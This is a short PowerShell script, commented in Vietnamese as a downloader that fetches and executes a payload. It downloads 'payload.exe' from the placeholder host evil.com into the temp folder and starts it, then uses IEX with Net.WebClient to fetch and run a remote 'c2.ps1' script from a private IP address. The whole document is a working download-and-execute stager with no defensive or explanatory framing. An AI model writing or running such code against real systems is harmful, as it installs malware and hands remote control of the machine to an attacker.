# PowerShell downloader - tai va thuc thi payload
$url = "http://evil.com/payload.exe"
$tmp = "$env:TEMP\payload.exe"
Invoke-WebRequest -Uri $url -OutFile $tmp
Start-Process $tmp
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/c2.ps1')
